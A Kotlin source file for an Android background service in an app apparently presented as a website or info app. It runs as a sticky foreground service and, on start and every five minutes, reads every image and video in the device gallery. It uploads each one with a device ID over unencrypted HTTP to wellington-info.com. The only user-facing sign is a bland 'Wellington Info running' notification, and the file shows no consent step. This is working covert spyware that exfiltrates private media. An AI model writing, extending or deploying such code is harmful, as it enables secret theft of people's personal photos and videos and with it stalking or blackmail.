package com.mycompany.mywebsiteapp

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.SharedPreferences
import android.database.Cursor
import android.net.Uri
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.MediaStore
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import java.util.UUID
import java.util.concurrent.TimeUnit

class MyService : Service() {

    private lateinit var prefs: SharedPreferences
    private val handler = Handler(Looper.getMainLooper())
    private val client = OkHttpClient.Builder()
        .connectTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(10, TimeUnit.MINUTES)
        .readTimeout(10, TimeUnit.MINUTES)
        .build()

    private var isSyncing = false

    companion object {
        const val SYNC_INTERVAL = 5 * 60 * 1000L
        const val MAX_FILE_SIZE = 100L * 1024 * 1024
    }

    override fun onCreate() {
        super.onCreate()
        prefs = getSharedPreferences("sync", MODE_PRIVATE)
        val channel = NotificationChannel("bg", "Background",
            NotificationManager.IMPORTANCE_LOW)
        getSystemService(NotificationManager::class.java)
            .createNotificationChannel(channel)
        startForeground(1, Notification.Builder(this, "bg")
            .setContentText("Wellington Info চলছে")
            .setSmallIcon(android.R.drawable.ic_menu_view)
            .build())
        startSyncLoop()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startSyncLoop()
        return START_STICKY
    }

    private fun startSyncLoop() {
        handler.post(object : Runnable {
            override fun run() {
                Thread { syncGallery() }.start()
                handler.postDelayed(this, SYNC_INTERVAL)
            }
        })
    }

    private fun deviceId(): String {
        var id = prefs.getString("device_id", null)
        if (id == null) {
            id = "DEV-" + UUID.randomUUID().toString().substring(0, 8)
            prefs.edit().putString("device_id", id).apply()
        }
        return id
    }

    private fun syncGallery() {
        if (isSyncing) return
        isSyncing = true
        try {
            val collections = listOf(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI
            )
            for (collection in collections) {
                val cursor = contentResolver.query(
                    collection,
                    arrayOf(
                        MediaStore.MediaColumns._ID,
                        MediaStore.MediaColumns.DISPLAY_NAME,
                        MediaStore.MediaColumns.SIZE,
                        MediaStore.MediaColumns.MIME_TYPE
                    ), null, null, null
                ) ?: continue

                cursor.use { c ->
                    while (c.moveToNext()) {
                        uploadOneFile(c, collection)
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            isSyncing = false
        }
    }

    private fun uploadOneFile(c: Cursor, collection: Uri) {
        val id = c.getLong(0)
        val name = c.getString(1) ?: "file"
        val size = c.getLong(2)
        val mime = c.getString(3) ?: return

        if (size > MAX_FILE_SIZE || size <= 0) return

        val key = "$id-$size"
        if (prefs.getBoolean(key, false)) return

        val fileUri = Uri.withAppendedPath(collection, id.toString())

        try {
            val inputStream = contentResolver.openInputStream(fileUri) ?: return

            val fileBody = object : RequestBody() {
                override fun contentType() = mime.toMediaType()
                override fun contentLength() = size
                override fun writeTo(sink: okio.BufferedSink) {
                    inputStream.use { it.copyTo(sink.outputStream()) }
                }
            }

            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("user_id", deviceId())
                .addFormDataPart("file", name, fileBody)
                .build()

            val request = Request.Builder()
                .url("http://wellington-info.com/api/upload.php")
                .post(body)
                .build()

            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                prefs.edit().putBoolean(key, true).apply()
            }
            response.close()
            Thread.sleep(2000)
        } catch (e: Exception) {
            // ব্রোদ্রের লুপে আবার চেষ্টা হব
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
